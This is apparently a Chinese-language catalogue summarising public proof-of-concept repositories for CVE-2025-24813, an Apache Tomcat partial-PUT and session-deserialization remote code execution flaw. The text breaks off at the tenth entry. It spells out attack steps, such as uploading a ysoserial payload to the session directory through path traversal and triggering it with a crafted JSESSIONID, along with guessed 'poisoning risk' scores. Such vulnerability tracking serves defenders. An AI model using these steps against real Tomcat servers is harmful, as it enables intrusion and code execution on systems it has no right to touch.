# CVE-2025-24813

> 📦 该CVE有 **52** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-24813-137f_Poc-CVE-2025-24813.md](../2025/CVE-2025-24813-137f_Poc-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 开启Partial PUT (默认开启), 应用使用基于文件的session持久化(默认位置), 应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，利用了路径等价性（内部点，例如 `file.Name`）结合启用了写入功能的默认 Servlet 和 Partial PUT 功能。该漏洞可能导致远程代码执行（RCE）、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用方式:**

1.  **前提条件:** 漏洞利用需要满足以下条件：
    *   默认 Servlet 开启写入 (disabled by default).
    *   支持 Partial PUT (enabled by default).
    *   对于RCE，应用需要使用 Tomcat 基于文件的 session 持久化，并且包含一个可以被反序列化攻击利用的库（例如，存在于classpath中的commons-collections）。
    *   对于信息泄露/文件篡改，需要攻击者了解敏感文件的上传目标 URL 位于公共上传目标 URL 的子目录下，且攻击者需要知道上传的敏感文件名，且敏感文件通过partial PUT上传。
2.  **漏洞利用步骤:**
    *   **获取 Session ID:** 攻击者首先需要获取一个有效的 JSESSIONID，可以通过访问 `/index.jsp` 获取，如果无法获取则使用默认值。
    *   **测试 PUT 方法:** 攻击者发送一个 PUT 请求来确认目标服务器是否允许使用 `Content-Range` 进行部分写入。
    *   **生成 Payload:**  攻击者使用 `ysoserial` 或者 Java 代码生成一个恶意的序列化对象。`ysoserial` 通过指定的 gadget（例如 `CommonsCollections6`）来执行命令。也可以生成一个包含恶意命令执行的Java .jar文件。
    *   **上传 Payload:**  攻击者利用路径遍历将 payload 上传到 Tomcat 的 session 目录。例如，`/uploads/../sessions/{JSESSIONID}.session`。
    *   **触发执行:**  攻击者使用包含恶意 JSESSIONID 的请求来访问应用程序。Tomcat 将会反序列化该 session 文件，从而执行攻击者注入的命令。

**有效性:**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞的 POC 代码**有效**。搜索结果中提到了该漏洞已被积极利用。提供的 POC 代码包含利用该漏洞进行 RCE 的 Python 脚本，并提供了详细的利用步骤和参数说明。

**投毒风险:**

评估提供的 POC 代码，投毒风险较低，约为 **10%**。主要考虑因素如下：

*   **代码结构:** 代码结构较为清晰，主要分为获取 Session ID、验证 PUT 方法、生成 Payload 和发送 Payload 等几个模块。
*   **依赖项:**  代码依赖 `ysoserial.jar`，这本身是一个已知的漏洞利用工具，如果攻击者替换了 `ysoserial.jar` 文件，则可能引入恶意代码。此外，java payload方式需要服务器具有java编译环境。
*   **潜在风险:**  `java_payload` 函数中使用 `Runtime.getRuntime().exec(c)` 直接执行命令，如果命令字符串 `cmd` 构造不当，可能会存在命令注入的风险。
*   **作者声明:**  README 文件中包含免责声明，说明该代码仅用于教育目的，这在一定程度上降低了作者进行恶意投毒的可能性。

总的来说，虽然代码本身看起来没有明显的恶意行为，但仍然需要谨慎使用，并确保从可信的来源获取 `ysoserial.jar`，并仔细检查命令字符串，避免引入额外的安全风险。 java payload方式需要服务器具有java编译环境,具有一定局限性。

**项目地址:** [137f/Poc-CVE-2025-24813](https://github.com/137f/Poc-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #2

**来源**: [CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露，文件被篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足特定配置条件，包括启用Default Servlet的写入功能，启用partial PUT支持，存在安全敏感文件上传的目标URL位于公共上传目标URL的子目录中，攻击者已知安全敏感文件的名称，以及安全敏感文件通过partial PUT上传。或者，启用Default Servlet的写入功能，启用partial PUT支持，应用程序使用Tomcat基于文件的会话持久性与默认存储位置，应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息，CVE-2025-24813 涉及 Apache Tomcat 的路径等效问题，可能导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。利用条件包括Default Servlet启用了写入，支持partial PUT，以及应用程序的特定配置。搜索引擎结果显示，该漏洞已被公开并被积极利用。

提供的 POC 代码尝试利用该漏洞。它首先使用 `argparse` 处理目标 URL 参数。然后，它包含一段 base64 编码的 payload，该 payload 是一个经过序列化的 Java 对象，旨在执行命令 `touch /tmp/RCE-success`。  该脚本将解码后的payload保存到`decoded_chain.bin`文件中。 然后，使用 `requests.put` 函数，通过构造包含 'Content-Range' 头部的 PUT 请求，利用 Tomcat 的 partial PUT 功能，将payload上传到目标服务器。PUT请求的目标URL是`TARGET_IP/payload.session`。脚本上传完成后删除临时文件。 最后使用Cookie进行getSession。

**有效性评估：** POC 的有效性取决于目标 Tomcat 服务器是否满足漏洞利用的全部条件。如果 Default Servlet 的写入已启用，并且启用了 partial PUT 支持，并且满足其他条件，则 POC 可能有效。

**投毒风险评估：** 仔细检查提供的 POC 代码，没有发现明显的投毒代码。该代码旨在利用已知的 Tomcat 漏洞，而不是在目标系统上植入后门或执行恶意操作。 代码中包含的base64编码的payload部分是最有可能存在风险的部分，但是payload中的命令是`touch /tmp/RCE-success`，该命令仅仅是创建一个文件，用于验证漏洞是否存在，并非恶意操作。

**利用方式总结：**

1.  **条件确认:** 确认目标 Tomcat 服务器启用了 Default Servlet 的写入功能，并启用了 partial PUT 支持，以及是否满足其他相关条件。
2.  **Payload 生成:**  生成一个恶意 Java 序列化对象，该对象可以执行任意代码，或者读取敏感文件。
3.  **Partial PUT 上传:**  使用 HTTP PUT 请求，通过设置 `Content-Range` 头部，将恶意 payload 分块上传到目标服务器上的特定路径（例如，`payload.session`）。
4.  **触发反序列化：**  Tomcat 尝试反序列化上传的文件，从而触发恶意代码的执行。


**项目地址:** [Alaatk/CVE-2025-24813-POC](https://github.com/Alaatk/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #3

**来源**: [CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md](../2025/CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：默认Servlet开启写入 (默认关闭)，支持Partial PUT (默认开启)，存在安全敏感文件的目标URL是公共上传目标URL的子目录，攻击者知晓敏感文件名，安全敏感文件通过Partial PUT上传，或应用程序使用Tomcat文件会话持久性（默认位置），应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞。该漏洞允许攻击者通过精心构造的包含内部点（file.Name）的文件名，利用默认Servlet中启用的写入功能和Partial PUT支持，进行远程代码执行、信息泄露和恶意内容注入。根据漏洞描述，攻击成功的关键在于Tomcat的配置以及应用程序是否使用了易受攻击的组件。

**有效性：** 从搜索结果来看，该漏洞已被确认存在并且有在野利用。但是，漏洞利用需要满足多个非默认配置条件，因此并非所有Tomcat实例都易受攻击。提供的POC代码 `/tmp/9a20e2370d216dc00af3f4d6145c600e/README.md` 内容过于简单，仅包含CVE编号，并不能直接用于漏洞利用，需要根据具体情况编写特定的利用代码，例如构造恶意的PUT请求。

**投毒风险：** 提供的POC代码非常简单，主要就是包含 CVE-2025-24813 的 README.md 文件。因此，投毒风险很低，但是不排除作者在其他相关文件中隐藏恶意代码的可能性，只是没有在此次提交中呈现，考虑到文件数量极少,故判断存在10%的投毒风险。

**利用方式：** 漏洞利用主要通过以下步骤：

1.  **利用Partial PUT上传恶意文件：** 攻击者构造包含内部点的文件名，并通过Partial PUT请求将其上传到目标服务器。
2.  **绕过路径检查：** 由于路径等价性问题，Tomcat可能无法正确处理包含内部点的文件名，导致绕过路径检查。
3.  **信息泄露/恶意内容注入：** 如果目标是信息泄露或恶意内容注入，攻击者需要知道目标敏感文件的名称和路径，然后通过覆盖或修改该文件来实现目的。
4.  **远程代码执行：** 如果应用程序使用了Tomcat的文件会话持久性，并且包含可用于反序列化攻击的库，攻击者可以利用该漏洞将恶意序列化对象写入会话文件，从而实现远程代码执行。攻击者可能会覆盖session文件，然后触发反序列化。

**总结：** CVE-2025-24813 是一个高危漏洞，但是利用条件较为苛刻。 提供的POC代码过于简单，无法直接用于攻击，需要根据目标环境进行定制。在实际环境中，需要仔细评估Tomcat的配置和应用程序的安全性，以确定是否存在被利用的风险。同时需要关注针对该漏洞的攻击尝试并及时采取缓解措施，例如禁用默认Servlet的写入功能或升级到修复版本。

**项目地址:** [AlperenY-cs/CVE-2025-24813](https://github.com/AlperenY-cs/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #4

**来源**: [CVE-2025-24813-AsaL1n_CVE-2025-24813.md](../2025/CVE-2025-24813-AsaL1n_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危 (取决于配置和利用方式，可能导致RCE、敏感信息泄露或文件内容篡改)

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** RCE需要满足以下条件：writes enabled for default servlet, support for partial PUT, 使用Tomcat文件session持久化默认位置, 应用包含可被反序列化攻击利用的库。信息泄露/内容篡改需要满足以下条件：writes enabled for default servlet, support for partial PUT, security sensitive上传URL是公共上传URL的子目录, 攻击者知道security sensitive文件的名字, security sensitive文件也是通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是一个Apache Tomcat中的路径等价性漏洞，源于对文件名中内部点（'file.Name'）处理不当。根据漏洞描述和搜索结果，此漏洞在特定配置下可能导致远程代码执行（RCE）、信息泄露或恶意内容被添加到上传文件中。

**有效性：**
根据搜索引擎结果和漏洞描述，该漏洞已被积极利用。提供的PoC代码利用了Tomcat的partial PUT特性以及session持久化机制（在满足一定条件下），尝试通过上传恶意序列化数据来实现RCE。

**利用方式：**
1.  **前提条件：**
    *   Tomcat的default servlet需要开启写入功能（默认关闭）。
    *   需要启用partial PUT支持（默认开启）。
    *   （RCE）应用使用Tomcat的文件session持久化，且为默认存储位置。
    *   （RCE）应用包含可被反序列化攻击利用的库，例如存在fastjson, jackson等。
    *   （信息泄露/内容篡改）存在安全敏感文件上传URL是公共上传URL的子目录， 且攻击者知道该敏感文件名。
2.  **攻击步骤：**
    *   攻击者构造一个恶意的序列化对象，对其进行Base64编码（PoC中`-d/--data` 参数）。
    *   攻击者指定目标URL（PoC中`-u/--url` 参数）。
    *   PoC脚本首先向目标URL发送PUT请求，其中`Content-Range`头指定了上传的范围，利用Tomcat的partial PUT特性。
    *   如果服务器返回409状态码，则表示partial PUT已成功处理。
    *   之后，PoC脚本会发送GET请求，并携带包含恶意序列化数据的JSESSIONID cookie（`.{random_str}`）。
    *   Tomcat反序列化session数据，从而触发RCE (如果满足RCE条件)。

**投毒风险：**
分析提供的PoC代码和Readme，可以发现：
*   脚本本身的功能是利用漏洞进行攻击。
*   脚本中没有发现明显的恶意代码，例如植入后门、篡改系统文件等。
*   脚本需要用户提供Base64编码的序列化数据，这意味着攻击者需要自行生成payload，脚本只是负责发送payload。
*   Readme中指明了利用方式及所需条件，较为详细。

因此，该仓库中存在作者隐藏的恶意代码的可能性较低，但不能完全排除。投毒风险评估为 10%。风险主要在于用户可能下载了被篡改过的poc，或者运行了来历不明的payload, 这些payload可能包含恶意行为。

**项目地址:** [AsaL1n/CVE-2025-24813](https://github.com/AsaL1n/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #5

**来源**: [CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露和文件被恶意修改

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (Tomcat 默认支持), 文件会话持久化启用 (context.xml 配置 PersistentManager 和 FileStore), 存在反序列化利用链 (类路径下包含存在漏洞的库)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，该漏洞源于 'file.Name' (内部点) 的处理不当。如果满足以下所有条件，则可能导致远程代码执行，信息泄露或文件篡改：

1.  **DefaultServlet 写入功能启用：** 必须在 `web.xml` 中配置 `readonly=false`，允许 DefaultServlet 写入文件。
2.  **Partial PUT 请求支持：** Tomcat 默认支持分块上传，允许攻击者通过分块上传恶意文件。
3.  **文件会话持久化启用：** 需要在 `context.xml` 中配置 `PersistentManager` 和 `FileStore`，启用基于文件的会话存储。
4.  **存在反序列化利用链：** 类路径下需要包含存在漏洞的库（例如，`commons-collections-3.2.1.jar`），使得攻击者可以通过反序列化漏洞执行任意代码。
5.  **信息泄露/文件篡改的先决条件:** 除了上述条件外，还需要满足：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**利用方式：**

1.  攻击者首先利用 Partial PUT 请求上传一个恶意构造的序列化对象，该对象包含一个反序列化利用链（例如，使用 Commons Collections）。
2.  由于启用了 DefaultServlet 的写入功能，恶意文件可以被写入到 Tomcat 的会话存储目录中。
3.  当 Tomcat 尝试反序列化该会话时，由于存在利用链，攻击者可以执行任意代码。
4. 若目标满足信息泄露/文件篡改的先决条件,攻击者可以通过构造恶意的Partial PUT请求，利用路径等价绕过限制，最终实现信息泄露或者文件篡改

**投毒风险分析：**

该POC代码提供了一个 Docker Compose 文件，用于搭建易受攻击的 Tomcat 环境。该环境配置了必要的组件（DefaultServlet 写入，Partial PUT，文件会话持久化），并且包含了一个 Commons Collections 库，可以用于反序列化攻击。

代码本身看起来是直接了当的漏洞演示。投毒风险较低，但是使用该POC时仍需注意。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的利用代码来看，该漏洞已经确认被利用，并且相关的利用方式和利用条件已经比较清晰。提供的POC代码针对的是 RCE 部分，有效性较高，但成功利用取决于是否满足所有前提条件。

**项目地址:** [B1gN0Se/Tomcat-CVE-2025-24813](https://github.com/B1gN0Se/Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #6

**来源**: [CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence/Partial PUT RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/Partial PUT远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet启用写入(默认禁用)，启用Partial PUT(默认启用)，目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且通过Partial PUT上传敏感文件。RCE还需要应用程序使用Tomcat的文件会话持久性，以及存在可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合启用了写入功能的默认Servlet和Partial PUT功能，可能导致远程代码执行和敏感信息泄露。漏洞利用方式如下：

1.  **信息泄露/内容注入:** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   目标URL是公共上传URL的子目录
    *   攻击者知道敏感文件名
    *   通过Partial PUT上传敏感文件
攻击者可以查看敏感文件或向其中注入恶意内容。

2.  **远程代码执行 (RCE):** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   应用程序使用Tomcat的文件会话持久性，且使用默认存储位置
    *   应用程序包含可利用的反序列化库
攻击者可以通过上传恶意序列化session文件，利用反序列化漏洞执行任意代码。

**有效性：**
根据搜索结果，CVE-2025-24813漏洞存在活跃的利用。PoC代码的README描述了一个基本的利用流程，包括克隆仓库、安装依赖、运行PoC脚本，表明该PoC可能有效，但具体利用成功与否取决于目标环境的配置是否满足漏洞利用条件。PoC的有效性较高，因为搜索结果显示该漏洞正在被积极利用。

**投毒风险：**
分析提供的PoC代码（README.md），投毒风险较低。README.md文件只包含漏洞描述、环境配置、使用方法和免责声明。虽然PoC代码没有直接展示`poc.py`的内容，但是根据描述`poc.py`脚本会提示用户输入目标URL，表明其功能是针对目标进行漏洞验证而非植入后门。当然，`poc.py`本身可能包含恶意代码。在没有查看 `poc.py` 的内容的情况下，预估`poc.py`存在投毒代码的可能性较低，大约10%。主要考虑到以下几点：

*   PoC旨在验证漏洞的存在，而非长期控制目标系统。
*   公开的PoC代码通常会接受安全社区的审查，增加投毒的难度。
*   作者声明仅用于教育和研究目的。

**利用方式总结：**
攻击者利用此漏洞的方式是，首先需要满足前置条件（Default Servlet开启写入、Partial PUT启用等）。然后，通过构造恶意的PUT请求，并利用路径等价，覆盖或者修改敏感文件，实现信息泄露或RCE。RCE场景依赖于反序列化漏洞的利用，需要上传精心构造的恶意序列化数据。

**项目地址:** [CEAlbez/CVE-2025-24813-PoC](https://github.com/CEAlbez/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #7

**来源**: [CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md](../2025/CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 1. 默认Servlet开启了写入 (默认禁用)
2. 支持Partial PUT (默认启用)
3. 应用使用Tomcat基于文件的Session持久化, 使用默认存储位置
4. 应用包含可被反序列化攻击利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用 'file.Name' (内部点) 来实现远程代码执行和/或信息泄露，以及/或通过启用了写入的默认 Servlet 向上传的文件添加恶意内容。

**漏洞利用方式：**
1.  **信息泄露/恶意内容添加：**  如果满足以下条件，攻击者可以查看安全敏感文件或向其中注入内容：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   通过 Partial PUT 上传安全敏感文件。

2.  **远程代码执行：**  如果满足以下条件，攻击者可以执行远程代码：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的会话持久性，并且使用默认的存储位置。
    *   应用程序包含一个可以用于反序列化攻击的库。

**POC分析：**
POC利用脚本`CVE_2025_24813.py`的利用流程大概如下：
1.  检查目标服务器的默认servlet是否开启PUT方法，主要通过PUT请求上传一个文件来判断.
2.  如果目标开启了PUT方法，则会生成一个ysoserial的payload，指定gadget和要执行的命令.
3.  然后将payload上传到`target_url/uploads/../sessions/{session_id}.session`，session_id是由参数指定

**投毒风险分析：**
*   脚本主要功能是漏洞利用，没有发现明显的恶意代码。
*   脚本会生成payload并上传，这个过程可能存在一定风险，但主要取决于执行的命令和payload的内容，而非脚本本身。
*  脚本中存在一些临时文件创建，然后删除的操作，例如`Exploit.java`, `Exploit.class`，这些是payload构造过程中的正常步骤，但如果删除失败，可能会在服务器上留下痕迹。
*  脚本有生成java payload的逻辑，但是java payload的生成是直接拼接字符串，命令在字符串中比较明显，不太容易做手脚。
*  考虑到ysoserial payload本身就可能被认为是具有潜在危害，因此将投毒风险评估为5%。主要是payload本身可能存在的潜在风险。

**结论：**
提供的POC代码看起来是有效的，如果目标环境满足漏洞利用的条件，可以成功执行命令。投毒风险较低，主要风险在于利用过程中生成的payload可能带来的危害。

**项目地址:** [Eduardo-hardvester/CVE-2025-24813](https://github.com/Eduardo-hardvester/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #8

**来源**: [CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md](../2025/CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md)

## CVE-2025-24813-Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 写入已启用默认Servlet,支持部分PUT,针对敏感上传的URL是公共上传URL的子目录,攻击者了解正在上传的安全敏感文件的名称,安全敏感文件也通过部分PUT上传. 或 写入已启用默认Servlet,支持部分PUT,应用程序使用Tomcat基于文件的会话持久化，使用默认存储位置,应用程序包含可能在反序列化攻击中被利用的库

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞（CWE-44）和一个反序列化漏洞(CWE-502)。 根据漏洞库信息和搜索结果，漏洞利用涉及利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 请求处理机制中的缺陷。 

**有效性分析：**
 根据搜索结果，CVE-2025-24813 漏洞已被积极利用。 多个来源（Rapid7, Recorded Future, Akamai, Zscaler, 西オアフ大学, XM Cyber, SonicWall, Esri）证实了这一点。Unit42 的报告也提供了测试该漏洞的信息。 提供的 POC 代码描述简单，是 vulhub 环境的搭建说明，但考虑到其他来源指出漏洞已被积极利用，可以认为存在可用的利用代码。

**投毒风险分析：**
 POC代码仅提供了一个用于搭建vulhub环境的README文档，内容非常简单，只包含 CVE-2025-24813 的 vulhub 环境的 POC 脚本说明。 这种情况下，作者进行恶意代码投毒的可能性很低。 因此，投毒风险评估为1%。

**利用方式分析：**
 根据漏洞描述，存在两种主要的利用方式：
 1. **信息泄露/恶意内容注入：** 如果满足以下所有条件，攻击者能够查看安全敏感文件和/或将内容注入这些文件：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者了解正在上传的安全敏感文件的名称。
    *   安全敏感文件也通过部分 PUT 上传。
 2.  **远程代码执行：** 如果满足以下所有条件，攻击者能够执行远程代码：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   应用程序使用 Tomcat 基于文件的会话持久化，使用默认存储位置。
    *   应用程序包含可能在反序列化攻击中被利用的库。

总而言之，漏洞利用依赖于对 Tomcat 服务器的配置和应用程序的特定环境的利用，包括启用的写入权限、对部分 PUT 请求的支持以及应用程序中存在的潜在反序列化漏洞。

**项目地址:** [Erosion2020/CVE-2025-24813-vulhub](https://github.com/Erosion2020/CVE-2025-24813-vulhub)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #9

**来源**: [CVE-2025-24813-FY036_cve-2025-24813_poc.md](../2025/CVE-2025-24813-FY036_cve-2025-24813_poc.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Tomcat <= 9.0.98, 10.1.0-M1 <= Tomcat <= 10.1.34, 11.0.0-M1 <= Tomcat <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入权限, 支持Partial PUT, 且目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传。或者，需要启用Default Servlet的写入权限, 支持Partial PUT, 应用使用Tomcat基于文件的session持久化，应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价问题，可能导致远程代码执行（RCE）和信息泄露。根据漏洞库信息和搜索引擎结果，该漏洞的利用涉及以下几个关键点：

1.  **路径等价 ('file.Name' (Internal Dot))**：攻击者可以通过操纵文件路径，绕过安全限制，访问或修改受保护的文件。
2.  **Default Servlet写入权限**：需要启用Default Servlet的写入权限（默认禁用）。
3.  **Partial PUT支持**：需要启用Partial PUT支持（默认启用）。攻击者可以通过分块上传恶意文件，从而绕过某些安全检查。
4.  **特定场景下的RCE**：
    *   如果应用程序使用Tomcat的基于文件的会话持久性，并且包含一个可以被用于反序列化攻击的库，攻击者可以通过上传包含恶意序列化数据的会话文件，执行任意代码。
    *   如果目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传，可能导致信息泄露。

**漏洞利用方式：**

1.  **利用路径等价绕过**：攻击者可能利用`file.Name`中的内部点（Internal Dot）来访问或修改受保护的文件。
2.  **Partial PUT攻击**：攻击者通过分块上传恶意文件，例如包含恶意序列化数据的会话文件，到Tomcat服务器上。
3.  **反序列化漏洞利用**：如果应用程序包含可以被用于反序列化攻击的库，攻击者可以使用精心构造的序列化数据，在服务器上执行任意代码。

**POC代码分析：**

提供的POC代码 `CVE-2025-24813-poc.py` 尝试利用该漏洞。它执行以下步骤：

1.  **发送反序列化数据**：使用 `send_request` 函数发送一个base64编码的反序列化数据到Tomcat服务器。该请求使用 `Content-Range` 头，模拟Partial PUT请求。
2.  **触发反序列化**：使用 `send_request_two` 函数，通过设置 `JSESSIONID` cookie，尝试触发反序列化过程。
3.  **验证漏洞**：检查服务器的响应状态码。如果状态码为409（冲突）且`send_request_two`返回1（状态码500），则认为漏洞存在。

**有效性评估：**

该POC代码尝试利用了基于反序列化的RCE漏洞。但是，该POC并没有提供完整的利用链，只是验证了漏洞的存在。因此，该POC代码的有效性取决于目标应用程序是否满足漏洞利用的全部条件，包括：

*   启用了Default Servlet的写入权限。
*   支持Partial PUT。
*   应用程序使用Tomcat基于文件的会话持久性。
*   应用程序包含可用于反序列化攻击的库。

**投毒风险评估：**

该POC代码存在较高的投毒风险。原因如下：

*   **未知的反序列化利用链**：POC代码中使用的反序列化数据 `rO0ABXNyAAtFeHBsb2l0VGVzdAAAAAAAAAABAwAAeHB4` 只是一个占位符，并没有包含实际的恶意代码。攻击者需要自行寻找并插入合适的利用链，才能实现RCE。
*   **可能包含恶意代码**：由于利用链需要攻击者自行构造，攻击者可能会在POC代码中插入恶意代码，例如后门或恶意脚本，从而感染其他用户。
*   **依赖外部资源**：POC代码可能会依赖外部资源，例如远程服务器或恶意网站。攻击者可以通过篡改这些外部资源，实现投毒攻击。

由于存在上述风险，建议用户在使用该POC代码时保持警惕，并仔细审查代码，确保其不包含任何恶意成分。

**综上所述，该POC代码的有效性取决于目标环境的配置和应用程序的依赖。同时，由于反序列化利用的复杂性和潜在的恶意代码注入风险，该POC代码存在较高的投毒风险。**

**项目地址:** [FY036/cve-2025-24813_poc](https://github.com/FY036/cve-2025-24813_poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #10

**来源**: [CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md](../2025/CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat 反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Apache Tomcat

